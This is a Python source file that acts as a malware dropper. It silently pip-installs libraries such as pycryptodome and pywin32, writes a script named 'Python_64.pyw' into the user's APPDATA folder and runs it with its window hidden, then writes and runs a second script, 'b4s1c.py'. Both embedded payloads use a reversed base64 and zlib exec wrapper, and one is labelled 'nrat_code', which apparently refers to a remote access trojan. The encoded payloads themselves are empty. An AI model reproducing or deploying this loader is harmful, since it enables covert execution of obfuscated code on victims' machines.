import os
import subprocess
import sys

def install_dependencies():
    required_libraries = ['pycryptodome', 'pywin32', 'requests', 'winregistry', 'colorama', 'termcolor']

    for lib in required_libraries:
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'show', lib], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except subprocess.CalledProcessError:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', lib, '--quiet'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def create_and_run_obfuscated_script(obfuscated_code):
    appdata_dir = os.path.join(os.getenv('APPDATA'), 'Python')
    os.makedirs(appdata_dir, exist_ok=True)

    script_path = os.path.join(appdata_dir, 'Python_64.pyw')
    with open(script_path, 'w') as f:
        f.write(obfuscated_code)

    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

    subprocess.Popen([sys.executable, script_path], startupinfo=startupinfo, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def create_and_run_script(script_code):
    current_dir = os.getcwd()
    script_path = os.path.join(current_dir, 'b4s1c.py')

    with open(script_path, 'w') as f:
        f.write(script_code)

    subprocess.Popen([sys.executable, script_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def main():
    nrat_code = """_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b''))"""
    basic_code = """_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b''))"""
    install_dependencies()
    create_and_run_obfuscated_script(nrat_code)
    create_and_run_script(basic_code)

if __name__ == "__main__":
    main()
